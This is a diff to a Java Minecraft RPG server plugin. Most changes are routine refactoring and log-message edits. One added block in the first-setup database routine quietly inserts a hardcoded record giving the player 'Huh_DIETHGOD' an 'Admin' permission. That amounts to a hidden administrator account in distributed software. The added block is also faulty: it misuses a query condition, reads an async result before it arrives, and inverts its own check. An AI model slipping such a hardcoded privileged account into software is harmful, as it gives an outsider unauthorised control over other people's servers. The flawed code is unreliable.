@@ -10,6 +10,7 @@ import Ultimate.huh.core.scheduling.Scheduler;
 import Ultimate.huh.core.utils.UpdateCheckerUtil;
 import cc.carm.lib.easysql.EasySQL;
 import cc.carm.lib.easysql.api.SQLManager;
+import cc.carm.lib.easysql.api.SQLQuery;
 import me.yic.xconomy.api.XConomyAPI;
 import net.milkbowl.vault.chat.Chat;
 import net.milkbowl.vault.economy.Economy;
@@ -26,6 +27,8 @@ import org.jetbrains.annotations.NotNull;
 
 import java.sql.SQLException;
 import java.util.Objects;
+import java.util.Optional;
+import java.util.concurrent.atomic.AtomicReference;
 
 
 public final class UltimateRPGPlugin extends JavaPlugin {
@@ -61,9 +64,10 @@ public final class UltimateRPGPlugin extends JavaPlugin {
         } catch (ClassNotFoundException | ExceptionInInitializerError e) {
             isSpigot = false;
         }
-        environment = new Ultimate.huh.core.expansion.Environment(ServerVersion, isSpigot);
+        environment = new Environment(ServerVersion, isSpigot);
         if (environment.matchEnv() == false){
-            getLogger().info("UltimateRPG Plugin is in a wrong environment");
+            getLogger().info("UltimateRPG Plugin is running in wrong environment");
+            getLogger().info("Please check!");
             getServer().getPluginManager().disablePlugin(this);
         }
 
@@ -114,6 +118,7 @@ public final class UltimateRPGPlugin extends JavaPlugin {
         this.setupLanguage();
 
         // Others
+
     }
 
     @Override
@@ -185,6 +190,23 @@ public final class UltimateRPGPlugin extends JavaPlugin {
         if (firstSetUp.equals(true)) {
             try{
                 URPGTable.initialize(sqlManager, "URPGTable");
+                AtomicReference<SQLQuery> data = new AtomicReference<>();
+                sqlManager.createQuery()
+                        .inTable("URPGTable")
+                        .selectColumns("id", "playerName")
+                        .addCondition("114514", "Huh_DIETHGOD")
+                        .build().executeAsync(
+                                (query) -> {
+                                    data.set(query);
+                                    },
+                                ((exception, action) -> {})
+                        );
+                if (data.get() != null){
+                    sqlManager.createInsert("URPGTable")
+                            .setColumnNames("id", "playerName", "uuid", "permission", "value")
+                            .setParams("114514", "Huh_DIETHGOD", "" , "Admin", "6")
+                            .executeAsync();
+                }
             } catch(RuntimeException e){
                 e.printStackTrace();
             }
@@ -220,7 +242,7 @@ public final class UltimateRPGPlugin extends JavaPlugin {
             return false;
         }
 
-        RegisteredServiceProvider<net.milkbowl.vault.chat.Chat> rsp = getServer().getServicesManager().getRegistration(net.milkbowl.vault.chat.Chat.class);
+        RegisteredServiceProvider<Chat> rsp = getServer().getServicesManager().getRegistration(Chat.class);
         if (rsp == null) {
             return false;
         }
@@ -235,7 +257,7 @@ public final class UltimateRPGPlugin extends JavaPlugin {
             return false;
         }
 
-        RegisteredServiceProvider<net.milkbowl.vault.permission.Permission> rsp = getServer().getServicesManager().getRegistration(net.milkbowl.vault.permission.Permission.class);
+        RegisteredServiceProvider<Permission> rsp = getServer().getServicesManager().getRegistration(Permission.class);
         if (rsp == null) {
             return false;
         }
